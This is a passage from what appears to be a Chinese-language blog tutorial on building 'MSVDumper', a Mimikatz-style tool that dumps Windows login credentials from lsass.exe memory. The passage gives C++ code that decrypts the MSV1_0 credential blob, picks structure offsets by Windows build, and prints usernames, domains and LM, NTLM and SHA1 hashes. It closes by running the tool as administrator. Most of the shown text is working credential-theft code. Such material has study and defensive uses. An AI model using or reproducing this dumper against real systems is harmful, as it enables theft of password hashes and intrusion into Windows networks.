在调用 `LsaEncryptMemory()` 函数时，参数 `Encrypt` 被设为 `FALSE`，因此将利用前文中提取出的初始化向量和密钥，对包含凭据的数据块进行解密。

### 3.2.3 打印用户哈希凭据

最后编写 `Msv1_0CredsOutput()` 函数，该函数根据 `NtOwfPassword`、`LmOwfPassword` 和 `ShaOwPassword` 的偏移量，从解密后的内存中取出它们的值，并以十六进制的格式打印出来，如下所示。

```c++
void Msv1_0CredsOutput(PGENERIC_PRIMARY_CREDENTIAL mesCreds)
{
	BOOL status = FALSE;
	PBYTE msvCredentials;
	const MSV1_0_PRIMARY_HELPER* pMSVHelper;

	if (mesCreds)
	{
		if (msvCredentials = (PBYTE)mesCreds->Buffer)
		{
			LsaUnprotectMemory(msvCredentials, mesCreds->Length);

			if (cLsass.osContext.BuildNumber < WIN_BUILD_10_1507)
				pMSVHelper = &MSV1_0_PrimaryHelper[0];
			else if (cLsass.osContext.BuildNumber < WIN_BUILD_10_1511)
				pMSVHelper = &MSV1_0_PrimaryHelper[1];
			else if (cLsass.osContext.BuildNumber < WIN_BUILD_10_1607)
				pMSVHelper = &MSV1_0_PrimaryHelper[2];
			else
				pMSVHelper = &MSV1_0_PrimaryHelper[3];

			UNICODE_STRING Username = *(PUNICODE_STRING)(msvCredentials + pMSVHelper->offsetToUserName);
			Username.Buffer = (PWSTR)((ULONG_PTR)(Username.Buffer) + (ULONG_PTR)(msvCredentials));
			wprintf(L"\n\t* Username    : %wZ", &Username);
			
			UNICODE_STRING LogonDomain = *(PUNICODE_STRING)(msvCredentials + pMSVHelper->offsetToLogonDomain);
			LogonDomain.Buffer = (PWSTR)((ULONG_PTR)(LogonDomain.Buffer) + (ULONG_PTR)(msvCredentials));
			wprintf(L"\n\t* Domain      : %wZ", &LogonDomain);

			if (!pMSVHelper->offsetToisIso || !*(PBOOLEAN)(msvCredentials + pMSVHelper->offsetToisIso))
			{
				if (*(PBOOLEAN)(msvCredentials + pMSVHelper->offsetToisLmOwfPassword))
				{
					wprintf(L"\n\t* LM          : ");
					PrintfHex(msvCredentials + pMSVHelper->offsetToLmOwfPassword, LM_NTLM_HASH_LENGTH);
				}
				if (*(PBOOLEAN)(msvCredentials + pMSVHelper->offsetToisNtOwfPassword))
				{
					wprintf(L"\n\t* NTLM        : ");
					PrintfHex(msvCredentials + pMSVHelper->offsetToNtOwfPassword, LM_NTLM_HASH_LENGTH);
				}
				if (*(PBOOLEAN)(msvCredentials + pMSVHelper->offsetToisShaOwPassword))
				{
					wprintf(L"\n\t* SHA1        : ");
					PrintfHex(msvCredentials + pMSVHelper->offsetToShaOwPassword, SHA_DIGEST_LENGTH);
				}
			}
		}
	}
}
```

至此，MSVDumper 的主要代码编写完成。

# 4. 运行效果演示

以管理员权限运行 MSVDumper，即可从系统 lsass.exe 进程内存中转储哈希凭据，如下图所示。

```powershell
MSVDumper.exe
```

![image-20230115235333634](/assets/posts/2023-01-31-sekurlsa-how-to-dump-user-login-credentials-from-msv1_0/image-20230115235333634.png)
